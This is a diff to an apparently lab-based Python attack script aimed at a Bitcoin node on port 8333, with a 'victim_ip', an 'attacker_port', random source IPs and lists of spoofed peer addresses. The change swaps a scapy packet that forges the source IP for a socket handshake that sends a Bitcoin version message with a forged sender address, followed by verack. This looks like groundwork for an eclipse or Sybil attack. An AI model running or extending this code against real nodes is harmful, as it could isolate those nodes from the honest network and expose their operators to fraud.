@@ -1,13 +1,19 @@
 from _thread import start_new_thread
 import atexit
-import time
+#import time
 import os
 from scapy.all import *
 #from impacket import ImpactDecoder, ImpactPacket
 
+
+import socket, time, bitcoin
+from bitcoin.messages import msg_version, msg_verack, msg_addr
+from bitcoin.net import CAddress
+
+
 victim_ip = '10.0.2.5'
 victim_port = 8333
-attacker_port = 12345
+attacker_port = 8333
 
 pending_spoof_IPs = []
 successful_spoof_IPs = []
@@ -25,17 +31,47 @@ def terminal(cmd):
 def random_ip():
 	return '.'.join(map(str, (random.randint(0, 255) for _ in range(4))))
 
+def version_pkt(client_ip, server_ip, port):
+    msg = msg_version()
+    msg.nVersion = 70002
+    msg.addrTo.ip = server_ip
+    msg.addrTo.port = port
+    msg.addrFrom.ip = client_ip
+    msg.addrFrom.port = port
+    return msg
+
 def spoof(src_ip, dst_ip):
 	src_port = attacker_port
 	dst_port = victim_port
 
 	print(f'Spoofing with IP {src_ip}:{src_port} to IP {dst_ip}:{dst_port}')
+	s = socket.socket()
+	s.connect((dst_ip, dst_port))
+	# Send version packet
+	s.send(version_pkt(src_ip, dst_ip, dst_port).to_bytes())
+	# Get verack packet
+	print('\n\n*** ')
+	print(s.recv(1924))
+	# Send verack packet
+	s.send(msg_verack().to_bytes())
+	# Get verack packet
+	print('\n\n*** ')
+	print(s.recv(1024))
+
+
+	print('\n\n*** ')
+	print('CONNECTION ESTABLISHED')
+	time.sleep(10)
+	s.close()
+
 
 	#try:
 	#	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	packet = IP(dst=dst_ip, src=src_ip) / TCP(dport=dst_port, sport=src_port, flags='S') / pld_VERSION
+	
+	#packet = IP(dst=dst_ip, src=src_ip) / TCP(dport=dst_port, sport=src_port, flags='S') / pld_VERSION
 	#	s.connect((dst_ip, dst_port))
-	send(packet)
+	
+	#send(packet)
 
 	#except Exception as e:
 	#	raise e
